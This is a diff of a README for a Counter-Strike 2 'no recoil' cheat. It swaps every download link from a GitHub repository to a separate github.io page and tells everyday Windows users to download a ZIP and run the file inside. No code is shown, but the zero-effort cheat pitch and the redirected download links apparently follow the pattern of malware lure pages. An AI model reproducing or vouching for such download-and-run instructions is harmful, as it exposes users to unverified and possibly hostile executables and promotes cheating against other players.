@@ -1,6 +1,6 @@
 # 🎯 cs2-no-recoil-2026 - Perfect Spray Control, Zero Effort
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_No_Recoil_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/duy09612-maker/cs2-no-recoil-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_No_Recoil_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://duy09612-maker.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ This guide is written for everyday Windows users. No coding skills required. Jus
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[https://github.com/duy09612-maker/cs2-no-recoil-2026](https://github.com/duy09612-maker/cs2-no-recoil-2026)**
+Visit this link to download the application: **[https://duy09612-maker.github.io](https://duy09612-maker.github.io)**
 
 Once you're on the page, look for the green **"Code"** button or the **"Releases"** section. Click it, then select **"Download ZIP"** or the latest release file. Your browser will save the file to your **Downloads** folder.
 
@@ -164,7 +164,7 @@ This software is provided for educational and entertainment purposes only. Using
 
 Don't forget – your journey to perfect spray control starts here:
 
-**[👉 Download cs2-no-recoil-2026 Now](https://github.com/duy09612-maker/cs2-no-recoil-2026)**
+**[👉 Download cs2-no-recoil-2026 Now](https://duy09612-maker.github.io)**
 
 Visit this link to download the application. Extract the ZIP, run the file, and dominate your next match with laser-like accuracy.
 
